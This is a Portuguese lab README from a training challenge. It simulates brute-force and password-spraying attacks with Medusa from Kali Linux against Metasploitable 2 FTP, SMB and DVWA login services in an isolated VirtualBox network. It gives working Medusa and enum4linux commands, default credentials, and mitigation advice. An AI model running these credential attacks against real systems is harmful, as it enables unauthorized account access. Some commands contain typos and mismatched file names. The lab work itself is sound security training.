# desafio-brute-force-kali-linux
Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux


🔒 Medusa Lab: Projeto de Simulação de Ataques de Força Bruta e Mitigação

Projeto de Testes de Força Bruta

Título: Simulação de Ataques de Força Bruta em Ambiente Controlado para Exercitar Medidas de Prevenção

Objetivo do Projeto
O objetivo principal deste laboratório é simular cenários controlados de ataques de força bruta e password spraying utilizando a distribuição Kali Linux e a ferramenta Medusa. O foco é compreender como essas vulnerabilidades são exploradas em diferentes protocolos (FTP, SMB e HTTP/Web) para, em seguida, documentar e exercitar as medidas preventivas e de mitigação adequadas.

1. Configuração do Ambiente
Para garantir um ambiente seguro e isolado, utilizaremos o VirtualBox para hospedar duas máquinas virtuais.
1.1 Máquinas Virtuais (VMs)
VM	Sistema Operacional/Imagem	Endereço IP (Exemplo)	Função no Laboratório
VM Atacante	Kali Linux	192.168.56.101	Contém a ferramenta Medusa, é a origem do ataque.
VM Alvo	Metasploitable 2	192.168.56.102	Ambiente vulnerável que hospeda serviços como FTP e SMB.
Servidor Web	DVWA (Dentro do Metasploitable 2)	192.168.56.102	Alvo para testes de formulários web (HTTP).
1.2 Configuração de Rede (VirtualBox)
É crucial configurar as VMs para que elas possam se comunicar, mas fiquem isoladas da rede pública.
1.	Modo de Rede: Configurei ambas as VMs (Kali e Metasploitable 2) para utilizar o modo "Rede Interna (Host-Only Adapter)".
2.	Verificação: No Kali Linux, executado ping 192.168.56.102 para confirmar a conectividade com o servidor Metaspoitable 2.


2. Cenários de Ataque Simulado com Medusa
O Medusa é uma ferramenta rápida, modular e paralela que suporta vários protocolos. Para os testes, utilizaremos wordlists simples para demonstrar o conceito.
Cenário A: Força Bruta em Serviço FTP
Objetivo: Obter as credenciais de login para o serviço FTP no Metasploitable 2.
Wordlists Utilizadas (Exemplos):
•	Usuários (user.txt): msfadmin, nroot, nadmin, user
•	Senhas (pass.txt): npassword, 123456, msfadmin, qwerty
Criação das Wordlists
Comando Medusa (Kali Linux) para criar listas: 
echo -e “msfadmin\nroot\user\nadmin” > user.txt
echo -e “npassword\123456\msfadmin\qwerty” > pass.txt
Comando Medusa Para Teste de Acesso:
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
Parâmetro	Descrição
-h	IP do host alvo (Metasploitable 2).
-U	Caminho para o arquivo de usuários (users.txt).
-P	Caminho para o arquivo de senhas (pass.txt).
-M	Módulo de protocolo a ser usado (FTP).
-t	Número de conexões simultâneas para acelerar o processo
Validação do Acesso: Após o ataque, a credencial válida deve aparecer no arquivo ftp como success. Confirme o acesso usando o User e Password validados no Kali Linux:
ftp 192.168.56.102
# Login: msfadmin
# Senha: msfadmin (na hora de digitar, os caracteres não ficam visíveis na tela).
# Observações: após conseguir o acesso, o atacante pode ir escalando outras possibilidades, inclusive fazer Upload ou Download de arquivos com os comandos put users.txt para enviar e get users.txt para receber


3. Cenário B: Password Spraying em Serviço SMB
Objetivo: Testar uma senha comum contra uma lista de usuários para identificar qual usuário está usando essa senha. O password spraying testa uma única senha contra muitos usuários.
Wordlists Utilizadas (Exemplos):
•	Usuários (smb_users.txt): msfadmin, nroot, nadmin, user
•	Senhas (senhas_spray.txt):  password, n123456, nWelcome123, nmsfadmin
Comando Medusa (Kali Linux) para enumeração:
•	enum4linux -a 192.168.56.102 | tee enum4_output.txt
-a	Ativa todas as técnicas possíveis de enumeração
tee	Gravar a saída do comando em um arquivo (enum4_output.txt)
•	less enum4_output.txt (para abrir o arquivo criado)
Nesse arquivo contém várias informações que podem ser importantes, como os serviços que podem ser possíveis alvos para ataque
Comando Medusa (Kali Linux) para criar listas:
•	echo -e "user\nmsfadmin\nservice" > smb_users.txt
•	echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
Comando Medusa (Kali Linux) para testar ataque:
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
Caso algumas das senhas seja a correta, o programa irá mostrar ACCOUNT FOUND
Validação do Acesso: Após o ataque, para verificar se a conexão realmente existe, utilize o comando:
  	smbclient -L //192.168.56.102 -U msfadmin


4. Cenário C: Automação de Tentativas em Formulário Web (DVWA)
Objetivo: Automatizar um ataque de força bruta contra um formulário de login web (HTTP POST) hospedado no DVWA, com um limite de segurança baixo ou médio configurado.
Configuração Prévia (Metasploitable 2/DVWA):
1.	Acesse o DVWA (192.168.56.102/dvwa/login.php) no Firefox do Kali.
2.	Verificar formulário de servidor e outras informações (F12 / Inspecionar)
3.	Capture a requisição HTTP POST ou as ferramentas de desenvolvedor do navegador para identificar:
•	URL de Ação: Onde o formulário envia os dados (ex: /dvwa/login.php).
•	Parâmetros: Os nomes dos campos de usuário e senha (geralmente username e password) e o token de sessão/segurança (ex: user_token).
Comando Medusa (Kali Linux):
Medusa usa a opção -m para definir o método HTTP, as variáveis para os payloads e a string de falha (F).
# Exemplo adaptado:
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \ 
-m PAGE: ‘/dvwa/login.php’ \
-m FORM: ‘username=^USER^&password=^PASS^&Login=Login’ \
-m  ‘FAIL=Login failed’ -t 6
Validação do Acesso: O Medusa reportará a combinação de usuário e senha que não gerou a string de falha, indicando login bem-sucedido.



5. Recomendações de Mitigação (Contramedidas)
Serviço Atacado	Requisito de Segurança	Recomendação de Mitigação
Geral (FTP/SMB/Web)	Senhas Fortes	Obrigatório: Implementar políticas de senhas complexas 
(mínimo de 12 caracteres, uso de maiúsculas, minúsculas, números e símbolos).
FTP/SMB	Limitação de Tentativas	Bloqueio de IP: Configurar firewalls  para banir o endereço IP de origem
 por um período após 3-5 falhas consecutivas de login.
FTP	Criptografia	Desativar FTP inseguro. Obrigatório: Migrar para SFTP (usando SSH) ou FTPS (usando SSL/TLS).
SMB	Segurança de Sessão	Garantir que o serviço SMB esteja configurado para exigir autenticação e criptografia de sessão. 
Desativar contas de convidado (Guest) desnecessárias.
Web (HTTP/DVWA)	Proteção de Formulário	CAPTCHA e Rate Limiting: Implementar CAPTCHA após a primeira ou segunda falha de login. 
Configurar Rate Limiting no Web Application Firewall (WAF),
 ou no load balancer para limitar o número de requisições por segundo por IP.
Web (HTTP/DVWA)	Tokens	Implementar e verificar tokens CSRF (Cross-Site Request Forgery) únicos para cada sessão
 e formulário,dificultando a automação por ferramentas como o Medusa.
Conclusão
